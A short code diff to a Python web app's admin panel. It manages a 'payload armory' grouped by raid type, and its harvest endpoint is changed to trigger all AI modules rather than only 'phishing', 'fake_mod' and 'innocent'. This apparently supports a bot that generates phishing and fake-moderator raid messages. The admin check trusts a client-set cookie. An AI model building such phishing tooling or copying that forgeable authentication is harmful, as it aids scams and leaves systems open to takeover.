@@ -217,8 +217,8 @@ async def admin_panel(request: Request, key: str = None):
         return response
     if admin_auth != "true": return HTMLResponse("Unauthorized", status_code=403)
     
-    # Sort by raid_type to group them, then by newest
-    payloads = await payload_armory.find().sort([("raid_type", 1), ("created_at", -1)]).to_list(150)
+    # Sort by raid_type to group them, then by newest (Bumped to 1000 so the UI can display all 450 max payloads)
+    payloads = await payload_armory.find().sort([("raid_type", 1), ("created_at", -1)]).to_list(1000)
     db = payload_armory.database
     collection_names = await db.list_collection_names()
     db_structure = {}
@@ -244,9 +244,12 @@ async def toggle_bot(request: Request):
 @app.post("/admin/force_harvest")
 async def admin_force_harvest(request: Request, bg_tasks: BackgroundTasks):
     if request.cookies.get("admin_auth") != "true": return RedirectResponse("/")
-    bg_tasks.add_task(harvest_payloads, "phishing")
-    bg_tasks.add_task(harvest_payloads, "fake_mod")
-    bg_tasks.add_task(harvest_payloads, "innocent")
+    
+    # Dynamically trigger harvesting for all modules based on CAPS dictionary
+    from ai import CAPS
+    for module_name in CAPS.keys():
+        bg_tasks.add_task(harvest_payloads, module_name)
+        
     return RedirectResponse("/admin?tab=armory", status_code=303)
 
 @app.post("/admin/delete_payload/{payload_id}")
